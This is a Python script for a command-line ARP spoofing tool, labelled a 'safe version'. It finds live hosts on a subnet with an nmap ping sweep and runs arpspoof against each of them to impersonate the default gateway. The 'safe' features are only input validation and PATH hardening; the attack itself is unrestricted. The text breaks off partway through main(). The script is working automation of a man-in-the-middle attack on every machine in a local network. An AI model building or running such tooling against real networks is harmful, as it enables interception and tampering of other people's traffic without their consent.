import sys
import os
import subprocess
import ipaddress
import argparse
import netifaces
import shutil

SAFE_PATH = "/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin"

def require_root():
    if hasattr(os, "geteuid") and os.geteuid() != 0:
        print("This script must be run as root.")
        sys.exit(1)

def get_safe_env():
    env = os.environ.copy()
    env["PATH"] = SAFE_PATH
    return env

def parse_args():
    parser = argparse.ArgumentParser(description="Network ARP spoofing tool (safe version)")
    parser.add_argument("network", help="Target network in CIDR notation (e.g., 192.168.1.0/24)")
    parser.add_argument("-i", "--interface", help="Network interface to use (defaults to the system's default gateway interface)")
    return parser.parse_args()

def validate_network(net_str):
    try:
        network = ipaddress.ip_network(net_str, strict=False)
    except ValueError:
        print(f"Invalid network specified: {net_str}")
        sys.exit(1)
    if network.prefixlen < 24:
        print(f"Network prefix length too small ({network.prefixlen}). Only /24 or larger is allowed.")
        sys.exit(1)
    return network

def find_executable(name):
    path = shutil.which(name)
    if path is None or not os.path.isabs(path):
        print(f"{name} is not installed or not found with an absolute path.")
        sys.exit(1)
    return path

def discover_live_hosts(network):
    nmap_path = find_executable("nmap")
    try:
        result = subprocess.run(
            [nmap_path, "-sn", str(network)],
            check=True,
            capture_output=True,
            text=True,
            timeout=10,
            env=get_safe_env(),
        )
    except subprocess.CalledProcessError as e:
        print(f"Error running nmap: {e}")
        sys.exit(1)
    except subprocess.TimeoutExpired:
        print("nmap execution timed out.")
        sys.exit(1)

    target_ips = []
    for line in result.stdout.splitlines():
        if line.startswith("Nmap scan report for"):
            parts = line.split()
            if parts:
                ip_str = parts[-1]
                try:
                    ipaddress.ip_address(ip_str)
                    target_ips.append(ip_str)
                except ValueError:
                    continue
    if not target_ips:
        print("No hosts detected in subnet.")
        sys.exit(0)
    return target_ips

def get_default_gateway():
    gateways = netifaces.gateways()
    if 'default' not in gateways or netifaces.AF_INET not in gateways['default']:
        print("Could not determine default gateway.")
        sys.exit(1)
    gw_ip, gw_iface, _ = gateways['default'][netifaces.AF_INET]
    return gw_ip, gw_iface

def run_arp_spoof(target_ips, gw_ip, interface):
    arpspoof_path = find_executable("arpspoof")
    for target in target_ips:
        try:
            subprocess.run(
                [arpspoof_path, "-i", interface, "-t", target, gw_ip],
                check=True,
                timeout=5,
                env=get_safe_env(),
            )
        except subprocess.CalledProcessError as e:
            print(f"ARP spoofing failed for {target}: {e}")
            continue
        except subprocess.TimeoutExpired:
            print(f"ARP spoofing timed out for {target}")
            continue

def main():
    require_root()
    args = parse_args()
    network = validate_network(args.network)

    if args.interface:
        interface = args.interface
        if interface not in netifaces.interfaces():
            print(f"Interface {interface} not found.")
            sys.exit(1)
    else:
        _, interface = get_default_gateway()

